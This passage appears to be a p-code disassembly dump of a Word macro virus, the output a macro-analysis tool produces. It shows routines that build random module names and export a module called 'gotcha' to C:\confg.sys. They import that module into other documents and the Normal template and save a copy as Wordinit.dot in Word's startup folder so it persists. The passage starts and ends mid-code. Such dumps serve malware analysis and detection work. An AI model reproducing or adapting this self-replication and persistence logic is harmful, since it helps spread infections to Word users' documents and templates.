' 	St E$ 
' 	EndIf 
' Line #172:
' 	Ld w 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St E$ 
' 	EndIf 
' Line #173:
' 	Ld w 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St E$ 
' 	EndIf 
' Line #174:
' 	Ld w 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St E$ 
' 	EndIf 
' Line #175:
' 	Ld w 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St E$ 
' 	EndIf 
' Line #176:
' 	Ld w 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St E$ 
' 	EndIf 
' Line #177:
' 	Ld w 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St E$ 
' 	EndIf 
' Line #178:
' 	Ld w 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St E$ 
' 	EndIf 
' Line #179:
' 	Ld w 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St E$ 
' 	EndIf 
' Line #180:
' 	Ld w 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St E$ 
' 	EndIf 
' Line #181:
' 	Ld w 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St E$ 
' 	EndIf 
' Line #182:
' 	Ld w 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St E$ 
' 	EndIf 
' Line #183:
' 	Ld w 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St E$ 
' 	EndIf 
' Line #184:
' 	Ld w 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St E$ 
' 	EndIf 
' Line #185:
' 	Ld w 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St E$ 
' 	EndIf 
' Line #186:
' 	Ld w 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St E$ 
' 	EndIf 
' Line #187:
' 	Ld w 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St E$ 
' 	EndIf 
' Line #188:
' 	Ld w 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St E$ 
' 	EndIf 
' Line #189:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St y 
' Line #190:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #191:
' 	Ld y 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #192:
' 	Ld y 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #193:
' 	Ld y 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #194:
' 	Ld y 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #195:
' 	Ld y 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #196:
' 	Ld y 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #197:
' 	Ld y 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #198:
' 	Ld y 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #199:
' 	Ld y 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #200:
' 	Ld y 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St False$ 
' 	EndIf 
' Line #201:
' 	Ld y 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St False$ 
' 	EndIf 
' Line #202:
' 	Ld y 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St False$ 
' 	EndIf 
' Line #203:
' 	Ld y 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St False$ 
' 	EndIf 
' Line #204:
' 	Ld y 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St False$ 
' 	EndIf 
' Line #205:
' 	Ld y 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St False$ 
' 	EndIf 
' Line #206:
' 	Ld y 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St False$ 
' 	EndIf 
' Line #207:
' 	Ld y 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St False$ 
' 	EndIf 
' Line #208:
' 	Ld y 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St False$ 
' 	EndIf 
' Line #209:
' 	Ld y 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St False$ 
' 	EndIf 
' Line #210:
' 	Ld y 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St False$ 
' 	EndIf 
' Line #211:
' 	Ld y 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St False$ 
' 	EndIf 
' Line #212:
' 	Ld y 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St False$ 
' 	EndIf 
' Line #213:
' 	Ld y 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St False$ 
' 	EndIf 
' Line #214:
' 	Ld y 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St False$ 
' 	EndIf 
' Line #215:
' 	Ld y 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St False$ 
' 	EndIf 
' Line #216:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St t 
' Line #217:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St G$ 
' 	EndIf 
' Line #218:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St G$ 
' 	EndIf 
' Line #219:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St G$ 
' 	EndIf 
' Line #220:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St G$ 
' 	EndIf 
' Line #221:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St G$ 
' 	EndIf 
' Line #222:
' 	Ld t 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St G$ 
' 	EndIf 
' Line #223:
' 	Ld t 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St G$ 
' 	EndIf 
' Line #224:
' 	Ld t 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #225:
' 	Ld t 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #226:
' 	Ld t 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #227:
' 	Ld t 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #228:
' 	Ld t 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #229:
' 	Ld t 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #230:
' 	Ld t 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #231:
' 	Ld t 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #232:
' 	Ld t 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #233:
' 	Ld t 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #234:
' 	Ld t 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St G$ 
' 	EndIf 
' Line #235:
' 	Ld t 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St G$ 
' 	EndIf 
' Line #236:
' 	Ld t 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St G$ 
' 	EndIf 
' Line #237:
' 	Ld t 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St G$ 
' 	EndIf 
' Line #238:
' 	Ld t 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St G$ 
' 	EndIf 
' Line #239:
' 	Ld t 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St G$ 
' 	EndIf 
' Line #240:
' 	Ld t 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St G$ 
' 	EndIf 
' Line #241:
' 	Ld t 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St G$ 
' 	EndIf 
' Line #242:
' 	Ld t 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St G$ 
' 	EndIf 
' Line #243:
' 	Ld A$ 
' 	Ld C$ 
' 	Add 
' 	Ld D$ 
' 	Add 
' 	Ld E$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld G$ 
' 	Add 
' 	St B$ 
' Line #244:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0006 "gotcha"
' 	ParamNamed New 
' 	Ld B$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #245:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #246:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #247:
' 	Ld Exitt_Word 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld DocName 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #248:
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #249:
' 	EndIfBlock 
' Line #250:
' 	EndFunc 
' Line #251:
' 	FuncDefn (Function Norminf_code())
' Line #252:
' 	OnError (Resume Next) 
' Line #253:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #254:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #255:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #256:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #257:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #258:
' 	ArgsCall (Call) Check_For_Doc 0x0000 
' Line #259:
' 	Ld Docinfd 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Scan_For_Doc 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #260:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #261:
' 	StartWithExpr 
' 	LitStr 0x000C "C:\confg.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #262:
' 	EndWith 
' Line #263:
' 	EndWith 
' Line #264:
' 	EndIfBlock 
' Line #265:
' 	Ld Init 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Scan_For_Doc 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #266:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #267:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #268:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #269:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #270:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #271:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #272:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #273:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St A$ 
' 	EndIf 
' Line #274:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St A$ 
' 	EndIf 
' Line #275:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St A$ 
' 	EndIf 
' Line #276:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St A$ 
' 	EndIf 
' Line #277:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St A$ 
' 	EndIf 
' Line #278:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St A$ 
' 	EndIf 
' Line #279:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St A$ 
' 	EndIf 
' Line #280:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St A$ 
' 	EndIf 
' Line #281:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St A$ 
' 	EndIf 
' Line #282:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St A$ 
' 	EndIf 
' Line #283:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St A$ 
' 	EndIf 
' Line #284:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St A$ 
' 	EndIf 
' Line #285:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St A$ 
' 	EndIf 
' Line #286:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St A$ 
' 	EndIf 
' Line #287:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St A$ 
' 	EndIf 
' Line #288:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St A$ 
' 	EndIf 
' Line #289:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St A$ 
' 	EndIf 
' Line #290:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St A$ 
' 	EndIf 
' Line #291:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St A$ 
' 	EndIf 
' Line #292:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St A$ 
' 	EndIf 
' Line #293:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St A$ 
' 	EndIf 
' Line #294:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St A$ 
' 	EndIf 
' Line #295:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St A$ 
' 	EndIf 
' Line #296:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St A$ 
' 	EndIf 
' Line #297:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St A$ 
' 	EndIf 
' Line #298:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St A$ 
' 	EndIf 
' Line #299:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St s 
' Line #300:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St C$ 
' 	EndIf 
' Line #301:
' 	Ld s 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St C$ 
' 	EndIf 
' Line #302:
' 	Ld s 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St C$ 
' 	EndIf 
' Line #303:
' 	Ld s 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St C$ 
' 	EndIf 
' Line #304:
' 	Ld s 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St C$ 
' 	EndIf 
' Line #305:
' 	Ld s 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St C$ 
' 	EndIf 
' Line #306:
' 	Ld s 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St C$ 
' 	EndIf 
' Line #307:
' 	Ld s 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St C$ 
' 	EndIf 
' Line #308:
' 	Ld s 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St C$ 
' 	EndIf 
' Line #309:
' 	Ld s 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St C$ 
' 	EndIf 
' Line #310:
' 	Ld s 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St C$ 
' 	EndIf 
' Line #311:
' 	Ld s 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St C$ 
' 	EndIf 
' Line #312:
' 	Ld s 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St C$ 
' 	EndIf 
' Line #313:
' 	Ld s 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St C$ 
' 	EndIf 
' Line #314:
' 	Ld s 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St C$ 
' 	EndIf 
' Line #315:
' 	Ld s 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St C$ 
' 	EndIf 
' Line #316:
' 	Ld s 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St C$ 
' 	EndIf 
' Line #317:
' 	Ld s 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St C$ 
' 	EndIf 
' Line #318:
' 	Ld s 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St C$ 
' 	EndIf 
' Line #319:
' 	Ld s 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St C$ 
' 	EndIf 
' Line #320:
' 	Ld s 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St C$ 
' 	EndIf 
' Line #321:
' 	Ld s 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St C$ 
' 	EndIf 
' Line #322:
' 	Ld s 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St C$ 
' 	EndIf 
' Line #323:
' 	Ld s 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "s"
' 	St C$ 
' 	EndIf 
' Line #324:
' 	Ld s 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St C$ 
' 	EndIf 
' Line #325:
' 	Ld s 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St C$ 
' 	EndIf 
' Line #326:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St q 
' Line #327:
' 	Ld q 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St D$ 
' 	EndIf 
' Line #328:
' 	Ld q 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St D$ 
' 	EndIf 
' Line #329:
' 	Ld q 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St D$ 
' 	EndIf 
' Line #330:
' 	Ld q 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St D$ 
' 	EndIf 
' Line #331:
' 	Ld q 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St D$ 
' 	EndIf 
' Line #332:
' 	Ld q 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St D$ 
' 	EndIf 
' Line #333:
' 	Ld q 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
